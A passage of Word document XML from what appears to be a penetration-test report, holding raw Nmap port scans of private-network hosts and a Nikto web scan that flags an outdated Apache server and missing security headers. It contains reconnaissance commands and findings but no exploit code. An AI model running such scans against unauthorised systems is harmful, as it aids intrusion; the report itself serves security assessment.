      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>80/tcp  open  http</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76428AF2" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>443/tcp open  https</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71D95C86" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>MAC Address: 00:15:5D:00:04:05 (Microsoft)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ABF6F33" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D19CE5E" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap scan report for 192.168.0.199</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="420ED9FE" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Host is up (0.00064s latency).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ECDCA0D" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Not shown: 997 filtered ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47CD3A53" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>PORT     STATE SERVICE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="274367AF" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>135/tcp  open  msrpc</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FED5CC5" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>2179/tcp open  vmrdp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="300CD440" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>3389/tcp open  ms-wbt-server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77375731" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>MAC Address: 00:15:5D:00:04:01 (Microsoft)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2118D8A1" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="513B6CA2" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap scan report for 192.168.0.210</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FC35C03" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Host is up (0.00054s latency).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34ADE523" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Not shown: 997 closed ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E3C47E9" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>PORT     STATE SERVICE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="399F611B" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>22/tcp   open  ssh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="325D09C6" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>111/tcp  open  rpcbind</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="364CB6EA" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>2049/tcp open  nfs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3811FB83" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>MAC Address: 00:15:5D:00:04:04 (Microsoft)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24EA9587" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="567713B7" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap scan report for 192.168.0.200</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="313C2BBF" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Host is up (0.0000060s latency).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C67172D" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Not shown: 998 closed ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49F0FC8D" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>PORT     STATE SERVICE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D1599F2" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>22/tcp   open  ssh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00BFA1E6" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>3389/tcp open  ms-wbt-server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52B2A4E2" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2A6C5203" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap done: 32 IP addresses (4 hosts up) scanned in 30.79 seconds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18930F37" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>root@kali:~# nmap 172.16.221.0/24</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CBB6774" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-01 16:45 EST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C7CA901" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Nmap scan report for 172.16.221.16</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="756C595C" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Host is up (0.00070s latency).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58AD21FF" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Not shown: 996 closed ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04FE0BFB" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>PORT    STATE SERVICE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="211E5595" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>22/tcp  open  ssh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23C5EDDA" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>23/tcp  open  telnet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B428AED" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>80/tcp  open  http</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42D891EB" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>443/tcp open  https</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0962CCE6" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E5B55F1" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap scan report for 172.16.221.237</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00FCD5D9" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Host is up (0.0018s latency).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EA48A65" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Not shown: 998 closed ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="095E371D" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>PORT    STATE SERVICE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E74FA45" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>80/tcp  open  http</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68B225BF" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>443/tcp open  https</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="155EF3D2" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7E46D8F9" w14:textId="76BC742F" w:rsidR="00877665" w:rsidRPr="00877665" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap done: 256 IP addresses (2 hosts up) scanned in 45.80 seconds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61025585" w14:textId="3FF7957D" w:rsidR="009A241B" w:rsidRDefault="00877665" w:rsidP="00877665">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="578" w:right="4" w:hanging="578"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="31" w:name="_Toc183984573"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Appendix </w:t>
      </w:r>
      <w:r w:rsidR="00C40453">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r w:rsidR="004305D8">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nikto Scans</w:t>
      </w:r>
      <w:bookmarkEnd w:id="31"/>
    </w:p>
    <w:p w14:paraId="1A7BBC08" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>root@kali:~# nikto -h http://172.16.221.237</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17E93229" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>- Nikto v2.1.6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68360BA9" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>---------------------------------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C6A3825" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ Target IP:          172.16.221.237</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11F8D6E9" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ Target Hostname:    172.16.221.237</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="125958AD" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ Target Port:        80</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08ABA8E3" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ Start Time:         2024-12-01 17:00:21 (GMT-5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C7ABD3E" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>---------------------------------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BBAD6E1" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ Server: Apache/2.2.22 (Ubuntu)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59D24A08" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>+ Server may leak inodes via ETags, header found with file /, inode: 45778, size: 177, mtime: Tue Apr 29 00:43:57 2014</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="736EFC01" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ The anti-clickjacking X-Frame-Options header is not present.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03C6B02C" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78613A8F" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45107117" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ Uncommon header 'tcn' found, with contents: list</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22CF63FC" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="093B9237" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D650F63" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="390C26C7" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ OSVDB-3233: /icons/README: Apache default file found.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="223863A8" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ 8725 requests: 0 error(s) and 9 item(s) reported on remote host</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6853E2D2" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
